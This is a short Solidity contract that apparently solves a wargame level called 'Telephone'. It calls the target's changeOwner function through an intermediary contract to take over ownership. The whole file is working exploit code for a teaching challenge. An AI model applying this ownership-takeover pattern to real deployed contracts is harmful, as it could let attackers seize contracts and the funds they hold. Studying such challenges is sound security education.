// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

interface Telephone {
    function changeOwner(address _owner) external;
}

contract TelephoneHack {

    Telephone telephoneContract;

  constructor(address _telephoneAddress) public {
    telephoneContract = Telephone(_telephoneAddress);
  }

  function attack(address _newOwner) public {
    telephoneContract.changeOwner(_newOwner);
  }
}